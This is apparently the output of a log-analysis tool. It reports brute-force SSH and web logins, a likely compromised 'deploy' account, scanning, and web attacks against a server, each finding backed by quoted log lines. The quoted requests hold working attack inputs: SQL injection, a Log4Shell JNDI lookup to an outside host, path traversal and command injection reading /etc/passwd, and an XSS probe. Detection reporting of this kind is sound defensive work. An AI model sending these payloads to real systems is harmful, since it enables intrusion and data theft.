# Log analysis report

Read 368 lines, 368 understood.

| Severity | Count |
|---|---|
| critical | 1 |
| high | 9 |
| medium | 4 |

| Severity | Rule | IP | Count | First seen | Last seen | ATT&CK |
|---|---|---|---|---|---|---|
| critical | ssh-login-after-bruteforce | 192.0.2.99 | 1 | 2026-11-18 12:06:30 | 2026-11-18 12:06:30 | T1078 Valid Accounts |
| high | web-login-bruteforce | 192.0.2.44 | 40 | 2026-11-18 13:02:00 | 2026-11-18 13:05:54 | T1110 Brute Force |
| high | ssh-bruteforce | 203.0.113.50 | 32 | 2026-11-18 09:12:00 | 2026-11-18 09:14:35 | T1110 Brute Force |
| high | ssh-bruteforce | 192.0.2.99 | 9 | 2026-11-18 12:05:00 | 2026-11-18 12:06:04 | T1110 Brute Force |
| high | ssh-bruteforce | 203.0.113.77 | 9 | 2026-11-18 10:40:00 | 2026-11-18 10:41:36 | T1110 Brute Force |
| high | web-attack-sql-injection | 203.0.113.15 | 4 | 2026-11-18 10:10:00 | 2026-11-18 10:10:21 | T1190 Exploit Public-Facing Application |
| high | web-attack-log4shell | 203.0.113.120 | 2 | 2026-11-18 11:25:00 | 2026-11-18 11:25:00 | T1190 Exploit Public-Facing Application |
| high | web-attack-path-traversal | 203.0.113.31 | 2 | 2026-11-18 11:20:30 | 2026-11-18 11:21:00 | T1190 Exploit Public-Facing Application |
| high | web-attack-xss | 203.0.113.31 | 1 | 2026-11-18 11:20:00 | 2026-11-18 11:20:00 | T1190 Exploit Public-Facing Application |
| high | web-attack-command-injection | 203.0.113.31 | 1 | 2026-11-18 11:21:00 | 2026-11-18 11:21:00 | T1190 Exploit Public-Facing Application |
| medium | web-scan | 203.0.113.9 | 24 | 2026-11-18 09:30:00 | 2026-11-18 09:30:46 | T1595 Active Scanning |
| medium | web-scanner-agent | 203.0.113.9 | 24 | 2026-11-18 09:30:00 | 2026-11-18 09:30:46 | T1595 Active Scanning |
| medium | ssh-user-enumeration | 203.0.113.77 | 9 | 2026-11-18 10:40:00 | 2026-11-18 10:41:36 | T1110 Brute Force |
| medium | web-scanner-agent | 203.0.113.15 | 4 | 2026-11-18 10:10:00 | 2026-11-18 10:10:21 | T1595 Active Scanning |

## ssh-login-after-bruteforce from 192.0.2.99

successful login as 'deploy' right after a brute force, the account may be compromised

```
Nov 18 12:06:30 web01 sshd[26558]: Accepted password for deploy from 192.0.2.99 port 51234 ssh2
```

## web-login-bruteforce from 192.0.2.44

40 POST requests to a login page in 10 min

```
192.0.2.44 - - [18/Nov/2026:13:02:00 +0000] "POST /wp-login.php HTTP/1.1" 302 4300 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"
192.0.2.44 - - [18/Nov/2026:13:02:06 +0000] "POST /wp-login.php HTTP/1.1" 200 4300 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"
192.0.2.44 - - [18/Nov/2026:13:02:12 +0000] "POST /wp-login.php HTTP/1.1" 200 4300 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"
```

## ssh-bruteforce from 203.0.113.50

32 failed SSH logins in 10 min, users tried: admin, oracle, root, test, ubuntu

```
Nov 18 09:12:00 web01 sshd[7156]: Failed password for invalid user oracle from 203.0.113.50 port 50935 ssh2
Nov 18 09:12:05 web01 sshd[18948]: Failed password for invalid user test from 203.0.113.50 port 33192 ssh2
Nov 18 09:12:10 web01 sshd[2953]: Failed password for root from 203.0.113.50 port 48493 ssh2
```

## ssh-bruteforce from 192.0.2.99

9 failed SSH logins in 10 min, users tried: deploy

```
Nov 18 12:05:00 web01 sshd[14728]: Failed password for deploy from 192.0.2.99 port 34773 ssh2
Nov 18 12:05:08 web01 sshd[13099]: Failed password for deploy from 192.0.2.99 port 47517 ssh2
Nov 18 12:05:16 web01 sshd[19557]: Failed password for deploy from 192.0.2.99 port 49982 ssh2
```

## ssh-bruteforce from 203.0.113.77

9 failed SSH logins in 10 min, users tried: ftp, git, jenkins, mysql, nagios, postgres ...

```
Nov 18 10:40:00 web01 sshd[15718]: Failed password for invalid user git from 203.0.113.77 port 35451 ssh2
Nov 18 10:40:12 web01 sshd[29946]: Failed password for invalid user postgres from 203.0.113.77 port 39104 ssh2
Nov 18 10:40:24 web01 sshd[29311]: Failed password for invalid user mysql from 203.0.113.77 port 44107 ssh2
```

## web-attack-sql-injection from 203.0.113.15

4 requests with sql injection patterns

```
203.0.113.15 - - [18/Nov/2026:10:10:00 +0000] "GET /blog?id=1%27%20OR%20%271%27=%271 HTTP/1.1" 200 7586 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"
203.0.113.15 - - [18/Nov/2026:10:10:07 +0000] "GET /blog?id=1%20UNION%20SELECT%20username,password%20FROM%20users HTTP/1.1" 500 1769 "-" "sqlmap/1.7.2#stable...
203.0.113.15 - - [18/Nov/2026:10:10:14 +0000] "GET /search?q=1;%20DROP%20TABLE%20users HTTP/1.1" 200 1243 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"
```

## web-attack-log4shell from 203.0.113.120

2 requests with log4shell patterns

```
203.0.113.120 - - [18/Nov/2026:11:25:00 +0000] "GET / HTTP/1.1" 200 388 "-" "${jndi:ldap://198.51.100.200:1389/a}"
203.0.113.120 - - [18/Nov/2026:11:25:00 +0000] "GET /?x=${jndi:ldap://198.51.100.200:1389/a} HTTP/1.1" 200 1119 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:120.0...
```

## web-attack-path-traversal from 203.0.113.31

2 requests with path traversal patterns

```
203.0.113.31 - - [18/Nov/2026:11:20:30 +0000] "GET /download?file=../../../../etc/passwd HTTP/1.1" 400 6785 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Ge...
203.0.113.31 - - [18/Nov/2026:11:21:00 +0000] "GET /ping?host=127.0.0.1;cat%20/etc/passwd HTTP/1.1" 200 4529 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) G...
```

## web-attack-xss from 203.0.113.31

1 request with xss patterns

```
203.0.113.31 - - [18/Nov/2026:11:20:00 +0000] "GET /search?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1" 200 4619 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:120...
```

## web-attack-command-injection from 203.0.113.31

1 request with command injection patterns

```
203.0.113.31 - - [18/Nov/2026:11:21:00 +0000] "GET /ping?host=127.0.0.1;cat%20/etc/passwd HTTP/1.1" 200 4529 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) G...
```

## web-scan from 203.0.113.9

24 client errors in 10 min, 11 sensitive paths probed

```
203.0.113.9 - - [18/Nov/2026:09:30:00 +0000] "GET /.env HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine)"
203.0.113.9 - - [18/Nov/2026:09:30:02 +0000] "GET /.git/config HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine)"
203.0.113.9 - - [18/Nov/2026:09:30:04 +0000] "GET /wp-login.php HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine)"
```

## web-scanner-agent from 203.0.113.9

known scanner user agent: Mozilla/5.0 (compatible; Nmap Scripting Engine)

```
203.0.113.9 - - [18/Nov/2026:09:30:00 +0000] "GET /.env HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine)"
```

## ssh-user-enumeration from 203.0.113.77

9 different non-existing usernames tried

```
Nov 18 10:40:00 web01 sshd[3640]: Invalid user git from 203.0.113.77 port 46269
Nov 18 10:40:00 web01 sshd[15718]: Failed password for invalid user git from 203.0.113.77 port 35451 ssh2
Nov 18 10:40:12 web01 sshd[19004]: Invalid user postgres from 203.0.113.77 port 43161
```

## web-scanner-agent from 203.0.113.15

known scanner user agent: sqlmap/1.7.2#stable (https://sqlmap.org)

```
203.0.113.15 - - [18/Nov/2026:10:10:00 +0000] "GET /blog?id=1%27%20OR%20%271%27=%271 HTTP/1.1" 200 7586 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"
```
